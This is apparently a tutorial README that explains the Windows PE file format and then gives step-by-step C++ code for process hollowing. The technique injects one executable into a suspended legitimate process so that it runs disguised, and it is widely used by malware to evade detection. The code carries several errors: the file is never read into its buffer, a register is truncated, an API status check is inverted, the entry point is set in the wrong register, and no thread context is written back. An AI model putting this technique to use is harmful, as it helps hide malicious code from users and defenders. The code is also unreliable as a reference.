## First of all, we must know the following

1. **We will work with Windows PE files**
2. **We will talk about MS-DOS and DOS**:
   - MS-DOS, or Microsoft Disk Operating System, was an operating system developed by Microsoft for personal computers ([Wikipedia](https://en.wikipedia.org/wiki/MS-DOS))
3. **We will talk about 32-bit and 64-bit Architectures**
_________________________________________________________________________________________________________

Portable Executable (PE) is a file format for executable files, object code, dynamic link libraries (DLL), FON font files and others used in 32-bit and 64-bit versions of the Microsoft Windows operating system according to Wikipedia.

These files contain a structure that we must understand for this technique:

![image](https://github.com/user-attachments/assets/6bff7db8-1895-432d-8915-8d0be11a8608)

We will only mention the parts that are necessary

## DOS Header
This header is a 64-bit structure that exists at the beginning of all PE Files, it is not important in modern Windows systems but is still included for compatibility reasons with previous versions.

This header converts the file into an MS-DOS executable, so that when it is loaded in MS-DOS, the DOS stub runs instead of the actual program.

Without this header, if you try to load the executable in MS-DOS, it will not load and will only produce a generic error.

### Structure
![image](https://github.com/user-attachments/assets/4eb708c2-d37d-4e26-979a-bc24c1c5172c)

This structure is important for the PE loader in MS-DOS, however only a few members of it are important for the PE loader in Windows systems, so we're not going to see everything, just the important members of the structure.

* e_magic: Is the first member of the DOS Header, it is a WORD so it occupies 2 bytes, it is usually called a magic number. It has a fixed value of 0x5A4D or MZ in ASCII, and serves as a signature that marks the file as an MS-DOS executable.
* e_lfanew: This is the last member of the DOS header structure, it is located at offset 0x3C within the DOS header and contains an offset to the beginning of the NT headers. This member is important for the PE loader in Windows systems because it tells the loader where to look for the file header.

![image](https://github.com/user-attachments/assets/669dcc0d-c8ef-4114-87a0-ea86c9c902b3)

As you can see, the first member of the header is the magic number with the fixed value we talked about which was 5A4D.

The last member of the header (at offset 0x3C) is called "File address of new exe header", it has the value 100, we can follow to that offset and we will find the beginning of the NT headers as expected:

## DOS Stub
The DOS stub is an MS-DOS program that prints an error message saying the executable is not compatible with DOS and then exits.

This is what runs when the program is loaded in MS-DOS, the default error message is "This program cannot be run in DOS mode", however this message can be changed by the user during compilation time.

That's all we need to know about the DOS stub, we don't really care about it, but it can do much more.

![image](https://github.com/user-attachments/assets/d150b7bc-2e5c-4962-8b66-c38b3404cc00)

## NT Header
The NT-Headers are an important part of portable executables. They contain a lot of information about the PE File.

There are two versions of the structure depending on the architecture (32-bit or 64-bit). In any case, the structure has three elements: a signature, a file header (IMAGE_FILE_HEADER) and an optional header (IMAGE_OPTIONAL_HEADER).

They contain a lot of relevant information for other areas, but not for this one, we will only focus on some parts of the optional header.

Specifically on the Entrypoint and ImageBase:
   - Entrypoint: Very basically, it is the memory address where code execution begins when a program starts
   - ImageBase: It is the virtual memory address where an executable file is loaded when it is executed

_________________________________________________________________________________________________________

## 1. We get the bytes of the file to inject and save them in a buffer

``` cpp
    HANDLE sourceFile = CreateFileA(sourceProcess.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (sourceFile == INVALID_HANDLE_VALUE) {
        ErrorExit("Could not open source file");
    }

    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), 0, sourceFileSize);
```

Where we use [CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) to open a [Handle](https://en.wikipedia.org/wiki/Handle_(computing)) to the file.

Then we must get its size using the [GetFileSize](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize) function

Finally, we allocate memory using [HeapAlloc](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc) to store the file bytes

## 2. Get the file headers

``` cpp
    PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)sourceFileBytesBuffer + sourceImageDOSHeader->e_lfanew);
```

Where we will get the Entrypoint and Imagebase, necessary for the execution of the file

## 3. Create process and start it in suspended state

``` cpp
    STARTUPINFOA startupInfo;                  // We will store the StartupInfo of the process
    PROCESS_INFORMATION processInfo;           // We will store the ProcessInformation of the process
```

The STARTUPINFOA and PROCESS_INFORMATION structures are initialized by filling them with zeros using [ZeroMemory](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85))
``` cpp
    ZeroMemory(&startupInfo, sizeof(startupInfo));   
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);
```

We use [CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) to start our process in SUSPENDED state

It is necessary that we run the process in suspended state, this means that the process starts but does not execute code

``` cpp
    if (!CreateProcessA(
        targetProcess.c_str(),    // Name of the process to create
        NULL,                      // Command line parameters
        NULL,                      // Process security attributes
        NULL,                      // Thread security attributes
        FALSE,                     // Handle inheritance
        CREATE_SUSPENDED,          // Creation flags - SUSPENDED
        NULL,                      // Process environment
        NULL,                      // Current directory
        &startupInfo,              // Startup information
        &processInfo               // Process information
    )) {
        ErrorExit("Could not create legitimate process");
    }

```

## 4. Get information about the created process

We access the main thread context using [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext).

Using [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory), we read the process base address from the PEB (offset +8).

``` cpp
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(processInfo.hThread, &context)) {
        ErrorExit("Could not get thread context");
    }
    // In x64, the Rbx register points to the PEB, if it were x86 we would use Ebx
    DWORD pebAddress = context.Rbx;

    // The process base address is at offset 0x8 of the PEB
    LPVOID imageBaseAddress = 0;
    SIZE_T bytesRead2 = 0;

    if (!ReadProcessMemory(
        processInfo.hProcess,
        (LPVOID)(pebAddress + 8),
        &imageBaseAddress,
        sizeof(LPVOID),
        &bytesRead2
    )) {
        ErrorExit("Could not read process base address");
    }
```

## 5. Unmap memory from the legitimate process

We must unmap memory from our process using [NtUnmapViewOfSection](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html) creating a "hole" for our code

``` cpp
if (!NtUnmapViewOfSection(processInfo.hProcess,imageBaseAddress)) 
```

## 6. Allocate new memory in the legitimate process

We must allocate memory in our "hole" using [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to be able to write the bytes of our payload

``` cpp
    LPVOID newBaseAddress = VirtualAllocEx(
        processInfo.hProcess,
        (LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase),
        sourceImageNTHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
```

## 7. Write PE headers to the legitimate process

We use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write data to the remote process
We copy all PE headers (DOS, NT, section tables)
These headers contain the "map" or "scheme" that the operating system needs to understand the structure of the executable

``` cpp
 if (!WriteProcessMemory(
        processInfo.hProcess,
        newBaseAddress,
        sourceFileBytesBuffer,
        sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    ))
```

## 8. Write PE sections to the legitimate process

We copy each section of the executable (.text, .data, .rdata, etc.) to its correct location in memory

```cpp
  PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
        (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
        );

    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
        std::cout << "  - Writing section: " << sourceImageSectionHeader->Name << std::endl;

        LPVOID sectionDestination = (LPVOID)(
            (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
            );

        LPVOID sectionSource = (LPVOID)(
            (DWORD_PTR)sourceFileBytesBuffer + sourceImageSectionHeader->PointerToRawData
            );

        if (!WriteProcessMemory(
            processInfo.hProcess,
            sectionDestination,
            sectionSource,
            sourceImageSectionHeader->SizeOfRawData,
            NULL
        )) {
            ErrorExit("Could not write a PE section");
        }

        sourceImageSectionHeader++;
    }
```
## 9. Update the thread context to point to the new entry point

We modify the suspended thread state so that when it continues, it begins to execute our code

``` cpp
    context.Rbx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
```

## 10. Resume process execution

We use ResumeThread to resume process execution

``` cpp
 if (ResumeThread(processInfo.hThread) == -1)
```

Finally, we free resources using [HeapFree](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree) and [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)

``` cpp
    HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
```
